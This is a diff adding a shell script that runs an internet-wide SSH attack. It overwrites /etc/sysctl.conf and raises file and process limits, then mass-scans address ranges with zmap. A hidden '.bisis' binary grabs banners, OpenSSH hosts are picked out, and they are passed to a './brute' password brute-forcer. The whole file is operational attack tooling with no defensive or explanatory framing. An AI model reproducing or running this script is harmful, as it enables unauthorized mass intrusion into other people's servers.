@@ -1,0 +1,20 @@
+chmod +x * ; chmod +x .*
+rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999 
+rm -rf banner.log ; rm -rf i input.txt ips bios.txt
+zmap -p $1 -o $1 -w r.lst -B1000M
+sleep 2 
+split -l 900000 $1 
+sleep 2
+./.bisis 6000 $1 xaa
+./.bisis 6000 $1 xab
+./.bisis 6000 $1 xac
+./.bisis 6000 $1 xad
+./.bisis 6000 $1 xae
+rm -rf xaa xab xac xad xae
+pkill ./.bisis
+pkill bisis
+sleep 2 
+cat banner.log | grep SSH-2.0-OpenSSH|cut -d ":" -f 1 > input.txt
+cat input.txt |awk '{print $1}' > i
+sleep 2 
+./brute $1 hacer 7000 i 3
